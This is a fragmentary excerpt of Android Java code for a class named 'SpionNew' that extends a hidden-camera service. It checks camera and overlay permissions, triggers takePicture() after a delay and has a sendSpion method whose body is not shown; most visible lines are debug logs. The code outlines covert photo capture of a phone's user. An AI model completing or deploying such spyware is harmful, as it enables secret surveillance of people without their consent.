...
public class SpionNew extends HiddenCameraService {

    private static final String TAG = "SpionNew";
    ...
    private void sendSpion(File file) throws IOException {
        ...
        Log.d("SpionNew", "We are in sendSpion!");
    ...
    public int onStartCommand(Intent intent, int flags, int startId) {
        ...
        Log.d("SpionNew", "We are in onStartCommand");


        Log.d("SpionNew", "We ask for pressmisions now");
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED) {


            Log.d("SpionNew", "We have all needed permessions");
            ...
            if (HiddenCameraUtils.canOverDrawOtherApps(this)) {
                ...
                Log.d("SpionNew", "Camera is about to start");
                ...
                new android.os.Handler().postDelayed(new Runnable() {
                    ...
                    public void run() {
                        ...
                        Log.d("SpionNew", "We are about to start the takePicture()");
                        takePicture();
                    }
                }, 2000L);
            } else {
            ...
            Log.d("SpionNew","We didnt have all the needed permissions");
    ...
    public void onCameraError(@CameraError.CameraErrorCodes int errorCode) {
        ...
        Log.d("SpionNew", "Something went wrong");
